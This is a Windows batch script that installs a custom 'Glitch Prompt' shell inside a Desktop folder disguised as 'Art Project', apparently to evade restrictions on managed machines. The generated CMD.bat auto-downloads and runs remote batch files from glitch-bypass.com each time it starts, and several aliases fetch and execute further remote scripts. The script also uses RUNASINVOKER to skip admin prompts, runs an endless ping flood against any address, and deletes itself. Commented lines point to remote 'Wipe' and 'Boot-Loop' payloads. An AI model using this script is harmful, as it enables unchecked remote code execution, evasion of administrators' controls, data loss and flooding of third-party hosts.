REM curl -o "setup.bat" "https://www.glitch-bypass.com/terminal/setup.bat" & setup.bat @ exit

@echo off

REM cd %userprofile% & cd .. & cd ..
REM IF EXIST "frost" (
REM   rmdir frost /S /Q
REM   cd %userprofile% & cd Desktop & cd OneDrive & cd Desktop
REM   del Launcher.exe
REM )



rem Old:
rem curl -o "setup.bat" "https://glitch872.github.io/setup.txt" & setup.bat & exit

rem curl -o "setup.bat" "https://1-glitch872.glitch.me/setup.txt" & setup.bat & exit

rem Wipe:
rem curl -o "setup.bat" "https://1-glitch872.glitch.me/setup2.txt" & setup.bat & exit

rem Force install discord
rem curl -o "setup.bat" "https://1-glitch872.glitch.me/z.bat" & setup.bat & exit

rem Boot-Loop
rem curl -o "setup.bat" "https://1-glitch872.glitch.me/update.bat" & setup.bat & exit





color 0A
title update/install
cd %userprofile%
echo .>update-bat
cd Desktop
rd /s /q "Art Project"
del update.bat
md "Art Project"
cd "Art Project"
md .bat
cd .bat
cls

echo @echo off>CMD.bat
echo cd %%userprofile%%>>CMD.bat
echo color 0A>>CMD.bat


echo doskey update=cd %%userprofile%%$tcd Desktop$tcd OneDrive$tcd Desktop$tcurl -o "a.bat" "https://www.glitch-bypass.com/terminal/update.bat"$ta.bat$texit>>CMD.bat
echo doskey old=curl -o "setup.bat" "https://glitch872.github.io/setup.txt"$tsetup.bat$texit>>CMD.bat
echo doskey min=curl -o "setup.bat" "https://www.glitch-bypass.com/terminal/min.bat"$tsetup.bat$texit>>CMD.bat
echo doskey ?=goto 3 >>CMD.bat
echo doskey ~=cd %%userprofile%%$tcls>>CMD.bat
echo doskey ~1=cd %%appdata%%$tcls>>CMD.bat
echo doskey >>CMD.bat
echo cd ..>>CMD.bat
echo cd ..>>CMD.bat
echo cd Windows>>CMD.bat
echo cd System32>>CMD.bat
echo FOR /F "delims=" %%%%F IN ('cd') DO SET System32=%%%%F>>CMD.bat
echo doskey ~2=cd %%System32%%$tcls>>CMD.bat
echo doskey ~~=goto 2 >>CMD.bat
echo doskey Boot=goto Boot >>CMD.bat
echo doskey Wipe=cd %%userprofile%%$tcd Desktop$trd /s /q "Art Project"$tcd OneDrive$tcd Desktop$tdel *SCMD.exe$texit>>CMD.bat
echo doskey no-admin=goto no-admin >>CMD.bat
echo doskey find=goto find>>CMD.bat
echo doskey ls=dir /w>>CMD.bat
echo doskey spam=goto spam>>CMD.bat
echo doskey clear=cls>>CMD.bat
echo doskey Discord=goto Discord>>CMD.bat
echo doskey hide=goto hide >>CMD.bat
echo doskey exe=curl -o "bat2exe.bat" "https://www.glitch-bypass.com/terminal/yep.bat"$tgoto 2 >>CMD.bat
echo doskey trash=cd %%userprofile%%$tcurl -o "setup.bat" "https://www.glitch-bypass.com/terminal/blood.bat"$tsetup.bat$texit>>CMD.bat
echo cd %%userprofile%%>>CMD.bat

echo IF EXIST update-bat (>>CMD.bat
echo     goto skip>>CMD.bat
echo )>>CMD.bat
echo echo .^>update-bat>>CMD.bat
echo curl -o "setup.bat" "https://www.glitch-bypass.com/terminal/setup.bat">>CMD.bat
echo setup.bat>>CMD.bat
echo :skip>>CMD.bat
echo del update-bat>>CMD.bat

echo cls>>CMD.bat
echo ver^>ver.txt>>CMD.bat
echo for /f "skip=1 delims=" %%%%v in (ver.txt) do (>>CMD.bat
echo     set "v=%%%%v">>CMD.bat
echo )>>CMD.bat
echo echo %%v%%>>CMD.bat
echo del ver.txt>>CMD.bat
echo echo (c) Microsoft Corporation. All rights reserved>>CMD.bat
echo echo.>>CMD.bat
echo echo {GlitchPrompt by Glitch872}>>CMD.bat
echo echo.>>CMD.bat
echo title Glitch Prompt>>CMD.bat

echo :1>>CMD.bat
echo color 0a>>CMD.bat
echo set a=>>CMD.bat
echo set /p a= %%cd%%^^^>>>CMD.bat
echo %%a%%>>CMD.bat
echo goto 1 >>CMD.bat

echo :2>>CMD.bat
echo explorer %%cd%%>>CMD.bat
echo cls>>CMD.bat
echo goto 1 >>CMD.bat

echo :3 >>CMD.bat
echo cls>>CMD.bat
echo help>>CMD.bat
echo echo upon starting CMD.bat, it will auto-update>>CMD.bat
echo echo ~              Jump to the userprofile directory>>CMD.bat
echo echo ~1             Jump to the appdata directory>>CMD.bat
echo echo ~2             Jump to the system32 directory>>CMD.bat
echo echo ~~             Opens File Explorer to the directory you are in>>CMD.bat
echo echo no-admin       Skip admin required (sometimes)>>CMD.bat
echo echo update         Update the file to the latest version>>CMD.bat
echo echo ?              Custom commands list>>CMD.bat
echo goto 1 >>CMD.bat

echo :Boot>>CMD.bat
echo cd %%userprofile%%>>CMD.bat
echo cd Desktop>>CMD.bat
echo cd Art Project\.bat>>CMD.bat
echo call CMD.bat>>CMD.bat
echo goto 1 >>CMD.bat

echo :no-admin >>CMD.bat
echo cls>>CMD.bat
echo dir /W>>CMD.bat
echo set /p a= File-Name: >>CMD.bat
echo Set file-dir="%%cd%%\%%a%%">>CMD.bat
echo cmd /min /C "set __COMPAT_LAYER=RUNASINVOKER && start "" %%file-dir%%">>CMD.bat
echo pause>>CMD.bat
echo cls>>CMD.bat
echo goto 1 >>CMD.bat

echo :find>>CMD.bat
echo set /p a= File-Name: >>CMD.bat
echo dir /s "C:\%%a%%">>CMD.bat
echo pause>>CMD.bat
echo goto 1 >>CMD.bat

echo :spam>>CMD.bat
echo set /p a=IP/Web Address: >>CMD.bat

echo :spam-2>>CMD.bat
echo ping %%a%% -n 1 >>CMD.bat
echo goto spam-2>>CMD.bat

echo :Discord>>CMD.bat
echo set save=%%cd%%>>CMD.bat
echo cd %%userprofile%%>>CMD.bat
echo cd ..>>CMD.bat
echo cd ..>>CMD.bat
echo FOR /F "delims=" %%%%F IN ('dir /S /b discord.exe') DO SET ExePath=%%%%F>>CMD.bat
echo cmd /min /C "set __COMPAT_LAYER=RUNASINVOKER && start "" "%%ExePath%%"">>CMD.bat
echo cd %%save%%>>CMD.bat
echo goto 1 >>CMD.bat

echo :hide>>CMD.bat
echo cls>>CMD.bat
echo pause^>nul>>CMD.bat
echo goto 1 >>CMD.bat



echo @echo off>log.bat
echo title File compiler list>>log.bat
echo echo Compiling>>log.bat
echo cd %%userprofile%%>>log.bat
echo cd ..>>log.bat
echo cd ..>>log.bat
echo dir /s %%cd%%*^>info.txt>>log.bat
echo cls>>log.bat
echo echo done>>log.bat
echo pause>>log.bat



echo @echo off>Help.bat
echo cls>>Help.bat
echo echo In CMD.bat, there are a few custom commands>>Help.bat
echo echo the command ~ Brings you to the userprofile directory>>Help.bat
echo echo the command ~1 Brings you to the appdata directory>>Help.bat
echo echo the command ~2 Brings you to the system32 directory>>Help.bat
echo echo the command ~~ Opens File Explorer to the directory you are in>>Help.bat
echo echo I made this so that there is ease of access to these main file directories>>Help.bat
echo echo using "no-admin" you can run a file without needing admin (will only work with some files)>>Help.bat
echo echo use "update" to update the file to the latest version>>Help.bat
echo echo (upon starting CMD.bat, it will auto-update)>>Help.bat
echo echo You can re-open this again by typing ? into CMD.bat>>Help.bat
echo pause>>Help.bat

cd %userprofile%
IF EXIST first-run-bat (
	goto skip
)
echo .>first-run-bat
cd Desktop
cd "Art Project"
cd .bat
cls

echo Done with setup
pause
call Help
:skip
cd Desktop
cd "Art Project"
cd .bat
rem explorer %cd%
start CMD
del Help.bat
(goto) 2>nul & del "%~f0" & exit